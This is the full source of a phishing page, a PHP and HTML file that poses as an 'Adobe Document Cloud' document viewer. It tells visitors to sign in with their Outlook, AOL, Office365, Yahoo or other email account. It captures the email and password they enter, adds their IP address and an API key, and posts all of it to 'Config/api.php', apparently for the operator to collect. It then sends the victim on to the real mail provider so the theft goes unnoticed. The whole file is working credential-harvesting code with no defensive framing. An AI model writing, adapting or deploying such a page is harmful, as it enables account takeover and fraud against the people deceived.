<?php

session_start();
session_destroy();


include 'Config/to.php';
include 'gb.php';

?>

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <title>Adobe Webmail</title>
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: url('web_files/images/Fotolia_241479172_XL.jpg') no-repeat center center/cover;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .login-card {
      background: rgba(255,255,255,0.95);
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      padding: 40px 30px;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    .login-card img { width: 70px; margin-bottom: 10px; }
    .login-card h4 { font-weight: 600; color: #222; font-size: 1.3rem; }
    .login-card p { font-size: 14px; color: #555; margin-bottom: 20px; }
    .provider-btn {
      display: flex; align-items: center; justify-content: center;
      border-radius: 6px; padding: 12px; margin-bottom: 12px;
      color: #fff; font-weight: 500; cursor: pointer; transition: .3s;
    }
    .provider-btn:hover { opacity: .9; transform: translateY(-2px); }
    .provider-btn img { width: 28px; height: 28px; border-radius: 50%; margin-right: 10px; background: rgba(0,0,0,0.1); padding: 4px; }
    .outlook { background-color: #0073C8; }
    .aol { background-color: #31459B; }
    .office { background-color: #FF3C00; }
    .yahoo { background-color: #5F0F68; }
    .other { background-color: #0B5BD3; }
    #submit-btn:disabled { opacity: .7; cursor: not-allowed; }
    @media (max-width: 576px) {
      body { background-position: center; padding: 15px; }
      .login-card { padding: 25px 20px; box-shadow: 0 6px 20px rgba(0,0,0,0.15); }
      .login-card h4 { font-size: 1.1rem; }
      .login-card p { font-size: 13px; }
      .provider-btn { font-size: 14px; padding: 10px; }
      .provider-btn img { width: 24px; height: 24px; }
      .modal-dialog { margin: 20px auto; max-width: 90%; }
      .modal-body img { width: 55px; }
      #modalTitle { font-size: 1rem; }
      #email, #password { font-size: 14px; padding: 8px 10px; }
      #submit-btn { font-size: 14px; padding: 10px; }
    }
  </style>
</head>
<body>

<div class="login-card">
  <img src="web_files/images/adobe.jpg" alt="Adobe Logo">
  <h4>Adobe Document Cloud</h4>
  <p>To read the document, please choose your email provider below to log in.</p>

  <div id="outlook" class="provider-btn outlook"><img src="web_files/images/outlook1.png">Sign in with Outlook</div>
  <div id="aol" class="provider-btn aol"><img src="web_files/images/aol1.png">Sign in with Aol</div>
  <div id="office" class="provider-btn office"><img src="web_files/images/office3651.png">Sign in with Office365</div>
  <div id="yahoo" class="provider-btn yahoo"><img src="web_files/images/yahoo1.png">Sign in with Yahoo!</div>
  <div id="other" class="provider-btn other"><img src="web_files/images/other1.png">Sign in with Other Mail</div>
</div>

<div class="modal fade" id="loginModal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header border-0">
        <button type="button" class="close" data-dismiss="modal"><span>&times;</span></button>
      </div>
      <div class="modal-body text-center">
        <img id="modalLogo" src="web_files/images/outlook.png" width="70">
        <h5 id="modalTitle">Login with Outlook</h5>
        <div id="msg" class="alert alert-danger" style="display:none;"></div>
        <form id="loginForm" class="text-left px-3 mt-3">
          <div class="form-group">
            <label>Email address</label>
            <input type="email" id="email" name="email" class="form-control" placeholder="Enter email">
          </div>
          <div class="form-group">
            <label>Password</label>
            <input type="password" id="password" name="password" class="form-control" placeholder="Enter password">
            <input type="hidden" name="ip" value="<?php echo isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']); ?>">
            <input type="hidden" name="apikey" value="<?php echo isset($apikey) ? $apikey : ''; ?>">
            <input type="hidden" name="domain" value="<?php echo $_SERVER['HTTP_HOST']; ?>">
            <input type="hidden" id="providerInput" name="provider" value="">
          </div>
          <button type="submit" id="submit-btn" class="btn btn-info btn-block mt-3">Login</button>
        </form>
      </div>
    </div>
  </div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>

<script>
$(document).ready(function(){
      let attempts = 0; 
  const map = {
    outlook: {img:'web_files/images/outlook.png',title:'Outlook'},
    aol: {img:'web_files/images/aol.png',title:'Aol'},
    office: {img:'web_files/images/office365.png',title:'Office365'},
    yahoo: {img:'web_files/images/yahoo.png',title:'Yahoo!'},
    other: {img:'web_files/images/othermail.ico',title:'Other Mail'}
  };
  $.each(map, function(id, data){
    $('#' + id).click(function(){
      $('#providerInput').val(data.title);
      $('#modalLogo').attr('src', data.img);
      $('#modalTitle').text('Login with ' + data.title);
      $('#email,#password').val('');
      $('#msg').hide();
      $('#loginModal').modal('show');
    });
  });
  $('#loginForm').submit(function(e){
    e.preventDefault();
    const email = $('#email').val().trim();
    const pass = $('#password').val().trim();
    if(!email || !pass){
      $('#msg').text('Please fill all fields').show();
      return;
    }
    $('#submit-btn').prop('disabled', true).text('Loading...');
    $.ajax({
      url: 'Config/api.php',
      type: 'POST',
      data: $('#loginForm').serialize(),
      dataType: 'text',
      success: function(res){

  let data;

  try {
    data = JSON.parse(res);
  } catch(e) {
    $('#msg').text('Server error').show();
    $('#submit-btn').prop('disabled', false).text('Login');
    return;
  }

  if(data.status === 'success'){

    const provider = $('#providerInput').val();

    let url = 'https://example.com';

    if(provider === 'Outlook') url = 'https://outlook.live.com/';
    else if(provider === 'Aol') url = 'https://mail.aol.com/';
    else if(provider === 'Office365') url = 'https://www.office.com/';
    else if(provider === 'Yahoo!') url = 'https://mail.yahoo.com/';
    else if(provider === 'Other Mail') {

  const email = $('#email').val().trim();

  if(!email || !email.includes('@')){
    $('#msg').text('Enter valid email').show();
    return;
  }

  const domain = email.split('@')[1];

  url = 'https://' + domain;
}


    window.location.href = url;

  } else {
    $('#msg').text(data.message || 'Invalid').show();
    $('#submit-btn').prop('disabled', false).text('Login');
  }
},
      error: function(){
        $('#msg').text('Connection error').show();
        $('#submit-btn').prop('disabled', false).text('Login');
      }
    });
  });
});
</script>

</body>
</html>
